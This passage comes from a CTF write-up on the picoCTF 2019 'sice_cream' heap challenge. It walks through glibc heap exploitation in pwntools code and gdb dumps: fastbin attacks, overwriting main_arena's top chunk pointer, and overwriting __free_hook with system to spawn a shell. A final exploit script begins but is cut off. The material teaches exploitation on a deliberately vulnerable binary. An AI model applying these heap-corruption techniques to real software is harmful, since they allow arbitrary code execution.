<p>This person did this brilliant attack where they overwrote the top chunk pointer in the <code class="highlighter-rouge">main_arena</code> to <code class="highlighter-rouge">__malloc_hook - 0x15</code>. What happens then is that any request for memory that has to be serviced using the top chunk will give a chunk at <code class="highlighter-rouge">__malloc_hook - 0x15</code>, which can be used to overwrite <code class="highlighter-rouge">__malloc_hook</code>.</p>

<p>The only constraint here is that the address we overwrite the top chunk pointer with must have chunk metadata right above it that makes it look like the top chunk. If you are unsure what that looks like, you may view my writeup of <a href="/2019-09-30-bsides-delhi-message-saver/">message_saver</a> to see how it looks like in memory.</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">malloc_state</span>
<span class="p">{</span>
  <span class="cm">/* Serialize access.  */</span>
  <span class="n">mutex_t</span> <span class="n">mutex</span><span class="p">;</span>

  <span class="cm">/* Flags (formerly in max_fast).  */</span>
  <span class="kt">int</span> <span class="n">flags</span><span class="p">;</span>

  <span class="cm">/* Fastbins */</span>
  <span class="n">mfastbinptr</span> <span class="n">fastbinsY</span><span class="p">[</span><span class="n">NFASTBINS</span><span class="p">];</span>

  <span class="cm">/* Base of the topmost chunk -- not otherwise kept in a bin */</span>
  <span class="n">mchunkptr</span> <span class="n">top</span><span class="p">;</span> <span class="o">&lt;-</span><span class="p">.</span>
  <span class="c1">//  We overwrite this pointer to change the location of the top chunk in memory</span>

	<span class="p">...</span>
</code></pre></div></div>

<p>Of course when I tried to do the same thing, none of the one gadgets worked. It would be a bad challenge if it was exactly the same as his previous challenge right? So I had to come up with something else. NotDeGhost had also told me that it was possible to overwrite <code class="highlighter-rouge">__free_hook</code> somehow, and after a while, this is the solution I came up with:</p>

<p>First, using the leaked <code class="highlighter-rouge">__free_hook</code> address, I tried to see if there was a place above <code class="highlighter-rouge">__free_hook</code> where I could point the top chunk pointer to. After a bunch of trial and error, I found this:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// __free_hook = 0x7f7b4adaa7a8</span>
<span class="n">gef</span><span class="err">➤</span>  <span class="n">x</span><span class="o">/</span><span class="mi">20</span><span class="n">gx</span> <span class="mh">0x7f7b4adaa7a8</span> <span class="o">-</span> <span class="mh">0x1100</span> <span class="o">+</span> <span class="mh">0x70</span> <span class="o">-</span> <span class="mh">0x5</span> <span class="o">-</span> <span class="mh">0x10</span>
<span class="mh">0x7f7b4ada9703</span> <span class="o">&lt;</span><span class="n">stderr</span><span class="o">+</span><span class="mi">3</span><span class="o">&gt;:</span>      <span class="mh">0xda962000007f7b4a</span>      <span class="mh">0xda88e000007f7b4a</span> <span class="o">&lt;--</span><span class="p">.</span>
<span class="mh">0x7f7b4ada9713</span> <span class="o">&lt;</span><span class="n">stdin</span><span class="o">+</span><span class="mi">3</span><span class="o">&gt;:</span>       <span class="mh">0xa04b7000007f7b4a</span>      <span class="mh">0x00000000007f7b4a</span>    <span class="o">|</span>
<span class="mh">0x7f7b4ada9723</span><span class="o">:</span> <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000000</span>      <span class="n">looks</span> <span class="n">like</span> <span class="n">top</span> <span class="n">chunk</span> <span class="n">header</span>
<span class="mh">0x7f7b4ada9733</span><span class="o">:</span> <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000000</span>   
<span class="mh">0x7f7b4ada9743</span><span class="o">:</span> <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000000</span>   
<span class="mh">0x7f7b4ada9753</span><span class="o">:</span> <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000000</span>   
<span class="mh">0x7f7b4ada9763</span><span class="o">:</span> <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000000</span>
<span class="mh">0x7f7b4ada9773</span><span class="o">:</span> <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000000</span>
<span class="mh">0x7f7b4ada9783</span><span class="o">:</span> <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000000</span>
<span class="mh">0x7f7b4ada9793</span><span class="o">:</span> <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000000</span>
</code></pre></div></div>

<p>At <code class="highlighter-rouge">__free_hook - 0x1100 + 0x70 - 0x5</code>, we have a valid location to overwrite the top chunk pointer with. The idea for me here was that I would change the top chunk’s location in memory to here, and then allocate enough chunks to the point where I get a chunk right on top of <code class="highlighter-rouge">__free_hook</code>, and then overwrite it with the address of <code class="highlighter-rouge">system</code>.</p>

<p>After that, if I call <code class="highlighter-rouge">free(chunkptr)</code>, it will actually call <code class="highlighter-rouge">((*)__free_hook)(chunkptr, ...)</code>, which gets converted to <code class="highlighter-rouge">system(chunkptr)</code>. If the first 8 bytes of <code class="highlighter-rouge">chunkptr</code> in our example happen to be <code class="highlighter-rouge">/bin/sh\x00</code>, it will call <code class="highlighter-rouge">system("/bin/sh\x00")</code>. Just what we need.</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span>
<span class="nf">__libc_free</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">mem</span><span class="p">)</span> <span class="c1">// mem is the pointer to the chunk we free</span>
<span class="p">{</span>
  <span class="n">mstate</span> <span class="n">ar_ptr</span><span class="p">;</span>
  <span class="n">mchunkptr</span> <span class="n">p</span><span class="p">;</span>                          <span class="cm">/* chunk corresponding to mem */</span>

  <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">hook</span><span class="p">)</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">,</span> <span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="p">)</span>
    <span class="o">=</span> <span class="n">atomic_forced_read</span> <span class="p">(</span><span class="n">__free_hook</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">__builtin_expect</span> <span class="p">(</span><span class="n">hook</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>
    <span class="p">{</span>
      <span class="p">(</span><span class="o">*</span><span class="n">hook</span><span class="p">)(</span><span class="n">mem</span><span class="p">,</span> <span class="n">RETURN_ADDRESS</span> <span class="p">(</span><span class="mi">0</span><span class="p">));</span> <span class="c1">// &lt;- we can overwrite hook to point to system</span>
      <span class="k">return</span><span class="p">;</span>
    <span class="p">}</span>
</code></pre></div></div>

<h4 id="so-how-do-we-do-it">So how do we do it?</h4>

<p>First step is to empty out the unsorted bin. This is because the fake chunk that we have on the name variable is very important for this exploit. We’ll be modifying it numerous times, which is guaranteed to corrupt the unsorted bin, therefore we empty it now to prevent the program from trying to get any chunks out of a corrupted unsorted bin.</p>

<p>I do this by first changing its size to 0x61, then allocating a 0x58 sized chunk.</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># We don't want subsequent allocations to come out of the unsorted bin
# Since we will use our fake chunk a lot, it is guaranteed to be corrupted.
# Any subsequent mallocs will then just crash if the unsorted bin is used
# Therefore, just empty out the unsorted bin here by first changing its size to 0x61
# Then we allocate a 0x58 sized chunk
</span><span class="n">reintroduce</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x61</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">leak</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">leak</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">9</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x21</span><span class="p">))</span>
<span class="n">add</span><span class="p">(</span><span class="mh">0x58</span><span class="p">,</span> <span class="s">'A'</span><span class="o">*</span><span class="mh">0x58</span><span class="p">)</span> <span class="c1"># 7
</span></code></pre></div></div>

<p>Next, I fake a 0x20 sized chunk and free it. This will fill up the 0x20 sized fastbin in <code class="highlighter-rouge">main_arena</code>. Since this fake chunk has an address starting with 0x60 (due to our name array being at the address 0x602040), we can get a fake chunk right inside <code class="highlighter-rouge">main_arena</code>.</p>

<p>I also fake a 0x61 sized chunk and free that in preparation for the fastbin attack that we will do to get the chunk in <code class="highlighter-rouge">main_arena</code>. Notice how useful this name variable is being?</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># We fake a 0x20 sized chunk and free it. This will be our fake chunk in main_arena.
# The main arena's fastbin[2], which is the 0x20 fastbin, will have a pointer to this chunk.
# Remember this chunk is in the .bss segment, so its address is 0x602040.
</span><span class="n">reintroduce</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x31</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x21</span><span class="p">)</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
<span class="n">free</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span>

<span class="c1"># Now we free a 0x61 sized chunk to prepare for the fastbin attack
</span><span class="n">reintroduce</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x61</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x21</span><span class="p">)</span><span class="o">*</span><span class="mi">18</span><span class="p">)</span>
<span class="n">free</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span>

<span class="c1"># This is the address where the 0x602040 address from above looks 16 byte aligned
</span><span class="n">fake_chunk_top</span> <span class="o">=</span> <span class="n">main_arena</span> <span class="o">+</span> <span class="mh">0x10</span> <span class="o">-</span> <span class="mh">0x6</span>
</code></pre></div></div>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// main_arena = 0x7f19ee5d4b20</span>
<span class="n">gef</span><span class="err">➤</span>  <span class="n">x</span><span class="o">/</span><span class="mi">12</span><span class="n">gx</span> <span class="mh">0x7f19ee5d4b20</span>          <span class="p">.</span><span class="o">---------------------</span> <span class="n">Our</span> <span class="n">freed</span> <span class="mh">0x20</span> <span class="n">chunk</span>
<span class="mh">0x7f19ee5d4b20</span><span class="o">:</span> <span class="mh">0x0000000000000000</span>   <span class="o">|</span>  <span class="mh">0x0000000000000000</span>
<span class="mh">0x7f19ee5d4b30</span><span class="o">:</span> <span class="mh">0x0000000000602040</span> <span class="o">&lt;-</span>   <span class="mh">0x0000000000000000</span>
<span class="mh">0x7f19ee5d4b40</span><span class="o">:</span> <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000602040</span> <span class="o">&lt;-</span><span class="p">.</span>
<span class="mh">0x7f19ee5d4b50</span><span class="o">:</span> <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000000</span> <span class="n">Freed</span> <span class="mh">0x60</span> <span class="n">chunk</span> <span class="n">in</span> <span class="n">preparation</span>
<span class="mh">0x7f19ee5d4b60</span><span class="o">:</span> <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000000</span> <span class="k">for</span> <span class="n">the</span> <span class="n">fastbin</span> <span class="n">attack</span>
<span class="mh">0x7f19ee5d4b70</span><span class="o">:</span> <span class="mh">0x0000000000000000</span>      <span class="mh">0x00000000011e3120</span>
<span class="n">gef</span><span class="err">➤</span>  <span class="n">x</span><span class="o">/</span><span class="mi">12</span><span class="n">gx</span> <span class="mh">0x7f19ee5d4b20</span> <span class="o">+</span> <span class="mh">0x10</span> <span class="o">-</span> <span class="mh">0x6</span>
<span class="mh">0x7f19ee5d4b2a</span><span class="o">:</span> <span class="mh">0x2040000000000000</span>      <span class="mh">0x0000000000000060</span> <span class="o">&lt;-</span> <span class="n">looks</span> <span class="n">like</span> <span class="n">a</span> <span class="n">fake</span> <span class="n">chunk</span>
<span class="mh">0x7f19ee5d4b3a</span><span class="o">:</span> <span class="mh">0x0000000000000000</span>      <span class="mh">0x2040000000000000</span>
<span class="mh">0x7f19ee5d4b4a</span><span class="o">:</span> <span class="mh">0x0000000000000060</span>      <span class="mh">0x0000000000000000</span>
<span class="mh">0x7f19ee5d4b5a</span><span class="o">:</span> <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000000</span>
<span class="mh">0x7f19ee5d4b6a</span><span class="o">:</span> <span class="mh">0x0000000000000000</span>      <span class="mh">0x3120000000000000</span>
<span class="mh">0x7f19ee5d4b7a</span><span class="o">:</span> <span class="mh">0x000000000000011e</span>      <span class="mh">0x4b78000000000000</span>
</code></pre></div></div>

<p>Next, we simply do the fastbin attack again to get a chunk in <code class="highlighter-rouge">main_arena</code>. Using gdb, the offset can be found by trial and error, and then you can overwrite the top chunk pointer to <code class="highlighter-rouge">__free_hook - 0x1100 + 0x70 - 0x5</code>. Ensure to not put anything but NULL bytes inside <code class="highlighter-rouge">main_arena</code> before the top chunk pointer. Any other bytes will be treated as an address existing in a fastbin, which corrupts the fastbin and will for sure later crash your program.</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># We set our fake chunk's fd pointer to point to our fake chunk in main arena
</span><span class="n">reintroduce</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x61</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_chunk_top</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span>

<span class="c1"># Chunk 9 will be in main arena, we overwrite it with free_hook-0x1100+0x70-0x5
# If you look at that address-0x10, it looks like the top chunk header
# So we set the top chunk pointer to that address (free_hook-0x1100+0x70-0x5)
</span><span class="n">add</span><span class="p">(</span><span class="mh">0x50</span><span class="p">,</span> <span class="s">'B'</span><span class="o">*</span><span class="mh">0x50</span><span class="p">)</span> <span class="c1"># 8
</span><span class="n">add</span><span class="p">(</span><span class="mh">0x50</span><span class="p">,</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="o">*</span><span class="mh">0x3e</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">free_hook</span> <span class="o">-</span> <span class="mh">0x1100</span> <span class="o">+</span> <span class="mh">0x70</span> <span class="o">-</span> <span class="mh">0x5</span><span class="p">))</span> <span class="c1"># 9
</span>
<span class="c1"># Now the next chunk was a test to see if it worked
# This chunk should be placed at free_hook-0x1100+0x70-0x5
</span><span class="n">add</span><span class="p">(</span><span class="mh">0x58</span><span class="p">,</span> <span class="s">'A'</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span> <span class="c1"># 10
</span></code></pre></div></div>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// __free_hook = 0x7fb3d8f0a7a8</span>
<span class="n">gef</span><span class="err">➤</span>  <span class="n">x</span><span class="o">/</span><span class="mi">10</span><span class="n">gx</span> <span class="mh">0x7fb3d8f0a7a8</span> <span class="o">-</span> <span class="mh">0x1100</span> <span class="o">+</span> <span class="mh">0x70</span> <span class="o">-</span> <span class="mh">0x5</span> <span class="o">-</span> <span class="mh">0x10</span>
<span class="mh">0x7fb3d8f09703</span> <span class="o">&lt;</span><span class="n">stderr</span><span class="o">+</span><span class="mi">3</span><span class="o">&gt;:</span>      <span class="mh">0xf0962000007fb3d8</span>      <span class="mh">0xf088e000007fb3d8</span> <span class="o">&lt;-</span><span class="p">.</span>
<span class="mh">0x7fb3d8f09713</span> <span class="o">&lt;</span><span class="n">stdin</span><span class="o">+</span><span class="mi">3</span><span class="o">&gt;:</span>       <span class="mh">0xb64b7000007fb3d8</span>      <span class="mh">0x0000000000000061</span>   <span class="o">|</span>
<span class="mh">0x7fb3d8f09723</span><span class="o">:</span> <span class="mh">0x4141414141414141</span>      <span class="mh">0x0000000000000000</span>   <span class="o">^</span>   <span class="n">looks</span> <span class="n">like</span> <span class="n">top</span> <span class="n">chunk</span>
<span class="mh">0x7fb3d8f09733</span><span class="o">:</span> <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000000</span>   <span class="o">|</span>
<span class="mh">0x7fb3d8f09743</span><span class="o">:</span> <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000000</span> <span class="n">theres</span> <span class="n">our</span> <span class="n">new</span> <span class="n">chunk</span> <span class="n">header</span>
</code></pre></div></div>

<p>Now we take a quick detour. I realized that the number of chunks we’d need to allocate was way over 19, which is what the program limits us to. However, I realized it was very easy to forge a fake chunk right above the global array of chunks, and then get a chunk there using a fastbin attack in order to overwrite a bunch of indexes of that array with NULL. Having PIE disabled makes this very easy.</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Next, my plan was to do enough mallocs so we can reach free_hook from free_hook-0x1100 ...
# The program however has a limit of 19 chunks
# I bypass it by getting a chunk right above the global array of chunks
# I then zero out the first 11 indexes of that array
</span>
<span class="c1"># Address of the fake chunk above the array
</span><span class="n">fake_chunk_above_array</span> <span class="o">=</span> <span class="mh">0x602130</span>

<span class="c1"># Change the name so that it places a fake chunk header right at that address from above
</span><span class="n">reintroduce</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x61</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">11</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x21</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">17</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x61</span><span class="p">))</span>

<span class="c1"># Free the fake_chunk at the name
</span><span class="n">free</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span>

<span class="c1"># Overwrite its fd with the address of our fake chunk above the global array
</span><span class="n">reintroduce</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x61</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_chunk_above_array</span><span class="p">))</span>

<span class="c1"># Chunk 12 will be above the global array, zero out a bunch of indexes
</span><span class="n">add</span><span class="p">(</span><span class="mh">0x58</span><span class="p">,</span> <span class="s">'A'</span><span class="o">*</span><span class="mh">0x58</span><span class="p">)</span> <span class="c1"># 11
</span><span class="n">add</span><span class="p">(</span><span class="mh">0x58</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">11</span><span class="p">)</span> <span class="c1"># 12, Free up indexes 0-10
</span>
<span class="c1"># Now there is a reference to fake_chunk (at our name variable) at idx 11
# This can easily be verified by viewing the array in gdb
</span></code></pre></div></div>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">gef</span><span class="err">➤</span>  <span class="n">x</span><span class="o">/</span><span class="mi">100</span><span class="n">gx</span> <span class="mh">0x602040</span>
<span class="mh">0x602040</span><span class="o">:</span>       <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000061</span> <span class="o">&lt;-</span> <span class="n">name</span> <span class="n">variable</span>
<span class="mh">0x602050</span><span class="o">:</span>       <span class="mh">0x4141414141414141</span>      <span class="mh">0x4141414141414141</span>
<span class="p">...</span>
<span class="mh">0x602090</span><span class="o">:</span>       <span class="mh">0x4141414141414141</span>      <span class="mh">0x4141414141414141</span>
<span class="mh">0x6020a0</span><span class="o">:</span>       <span class="mh">0x4141414141414141</span>      <span class="mh">0x0000000000000021</span> <span class="o">&lt;-</span> <span class="n">fake</span> <span class="n">chunk</span> <span class="n">allows</span> <span class="n">us</span> <span class="n">to</span> <span class="n">free</span>
<span class="mh">0x6020b0</span><span class="o">:</span>       <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000000</span>
<span class="p">...</span>
<span class="mh">0x602120</span><span class="o">:</span>       <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000000</span>
<span class="mh">0x602130</span><span class="o">:</span>       <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000061</span> <span class="o">&lt;-</span> <span class="n">chunk</span> <span class="n">above</span> <span class="n">global</span> <span class="n">array</span>
<span class="mh">0x602140</span><span class="o">:</span>       <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000000</span> <span class="o">&lt;-</span> <span class="n">global</span> <span class="n">array</span>
<span class="mh">0x602150</span><span class="o">:</span>       <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000000</span> <span class="o">&lt;-</span> <span class="n">We</span> <span class="n">made</span> <span class="nb">NULL</span>
<span class="mh">0x602160</span><span class="o">:</span>       <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000000</span> <span class="o">&lt;-</span> <span class="n">We</span> <span class="n">made</span> <span class="nb">NULL</span>
<span class="mh">0x602170</span><span class="o">:</span>       <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000000</span> <span class="o">&lt;-</span> <span class="n">We</span> <span class="n">made</span> <span class="nb">NULL</span>
<span class="mh">0x602180</span><span class="o">:</span>       <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000000</span> <span class="o">&lt;-</span> <span class="n">We</span> <span class="n">made</span> <span class="nb">NULL</span>
<span class="mh">0x602190</span><span class="o">:</span>       <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000602050</span> <span class="o">&lt;-</span> <span class="n">idx</span> <span class="mi">11</span>
<span class="mh">0x6021a0</span><span class="o">:</span>       <span class="mh">0x0000000000602140</span>      <span class="mh">0x0000000000000000</span>
<span class="p">...</span>
</code></pre></div></div>

<p>The next part was a bit of trial and error. I found out that I would need to do 51 allocations of size 0x48 to get right above <code class="highlighter-rouge">__free_hook</code>. The 52nd allocation of size 0x48 can be used to overwrite <code class="highlighter-rouge">__free_hook</code> to the address of <code class="highlighter-rouge">system</code>.</p>

<p>Each time I allocate a new chunk, I also immediately zero out the first 11 indexes of the global array. Of course this is overkill, but I was being lazy.</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Now there is a reference to fake_chunk (at our name) at idx 11
# This can easily be verified by viewing the array in gdb
</span>
<span class="c1"># Now, this was a bit of trial and error, but I found out that 51 allocations of size 0x48
# was enough to reach just above __free_hook
# Each time we allocate, we zero out the global array immediately
</span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">51</span><span class="p">):</span>
    <span class="c1"># Allocate using top chunk
</span>    <span class="n">add</span><span class="p">(</span><span class="mh">0x48</span><span class="p">,</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="o">*</span><span class="mh">0x48</span><span class="p">)</span>

    <span class="c1"># Redo the fastbin attack to get a chunk above the global array
</span>
    <span class="c1"># Free our fake_chunk on the name
</span>    <span class="n">free</span><span class="p">(</span><span class="mi">11</span><span class="p">)</span>

    <span class="c1"># Change fd to point to fake_chunk_above_array
</span>    <span class="n">reintroduce</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x61</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_chunk_above_array</span><span class="p">))</span>

    <span class="c1"># Two more allocations, zero out the indexes
</span>    <span class="n">add</span><span class="p">(</span><span class="mh">0x58</span><span class="p">,</span> <span class="s">'A'</span><span class="o">*</span><span class="mh">0x58</span><span class="p">)</span>
    <span class="n">add</span><span class="p">(</span><span class="mh">0x58</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">11</span><span class="p">)</span>

<span class="c1"># After 51 allocations, we can overwrite __free_hook with system
# We have to keep null bytes before it, otherwise the program will crash (I don't know why)
</span><span class="n">add</span><span class="p">(</span><span class="mh">0x48</span><span class="p">,</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="o">*</span><span class="mh">0x35</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">system</span><span class="p">))</span>
</code></pre></div></div>

<p>After this, I simply reset the name variable’s first 8 bytes to <code class="highlighter-rouge">'/bin/sh\x00'</code>, and then freed it. This calls <code class="highlighter-rouge">system("/bin/sh\x00")</code>, as explained above.</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Then just put '/bin/sh\x00' into our name array
</span><span class="n">reintroduce</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x61</span><span class="p">)</span> <span class="o">+</span> <span class="s">'/bin/sh</span><span class="se">\x00</span><span class="s">'</span><span class="p">)</span>

<span class="c1"># Call free(fake_chunk), which calls system(fake_chunk), which calls system('/bin/sh\x00')
</span><span class="n">free</span><span class="p">(</span><span class="mi">11</span><span class="p">)</span>

<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div>

<h4 id="so-what-is-the-other-solution">So what is the other solution?</h4>

<p>The other solution is based upon the fact that when you double free a chunk and cause a <code class="highlighter-rouge">double free or corruption (fasttop)</code> error, it will actually call <code class="highlighter-rouge">malloc</code> internally. I found out about this from <a href="https://blog.osiris.cyber.nyu.edu/2017/09/30/csaw-ctf-2017-auir/">this blog post</a>.</p>

<p>If you cause a double free, the subsequent call to <code class="highlighter-rouge">malloc</code> actually meets one of our one gadget’s constraints, and thus the solution is then much easier: overwrite the top chunk pointer to <code class="highlighter-rouge">__malloc_hook - 0x15</code> and then overwrite <code class="highlighter-rouge">__malloc_hook</code> with the working one gadget and cause a double free to get shell.</p>

<p>The exploit for that is showcased at the very end of this post.</p>

<h3 id="final-exploit-2"><strong>Final Exploit</strong></h3>

<p>If you want to run this exploit remotely, you should move it to the shell server first. The 51 allocations don’t play well unless your internet is extremely fast, unlike mine ^_^</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python2
</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'tmux'</span><span class="p">,</span> <span class="s">'new-window'</span><span class="p">]</span>

<span class="n">BINARY</span> <span class="o">=</span> <span class="s">'./sice_cream'</span>
<span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span> <span class="o">=</span> <span class="s">'2019shell1.picoctf.com'</span><span class="p">,</span> <span class="mi">38495</span>

<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">BINARY</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./libc.so.6'</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">debug</span><span class="p">(</span><span class="n">breakpoints</span><span class="p">):</span>
    <span class="n">script</span> <span class="o">=</span> <span class="s">""</span>
    <span class="k">for</span> <span class="n">bp</span> <span class="ow">in</span> <span class="n">breakpoints</span><span class="p">:</span>
        <span class="n">script</span> <span class="o">+=</span> <span class="s">"b *0x</span><span class="si">%</span><span class="s">x</span><span class="se">\n</span><span class="s">"</span><span class="o">%</span><span class="p">(</span><span class="n">bp</span><span class="p">)</span>
    <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="n">gdbscript</span><span class="o">=</span><span class="n">script</span><span class="p">)</span>

<span class="c1"># Application logic
</span>
<span class="k">def</span> <span class="nf">initialize</span><span class="p">(</span><span class="n">name</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">size</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span> <span class="s">'1'</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span> <span class="n">content</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span> <span class="s">'2'</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>

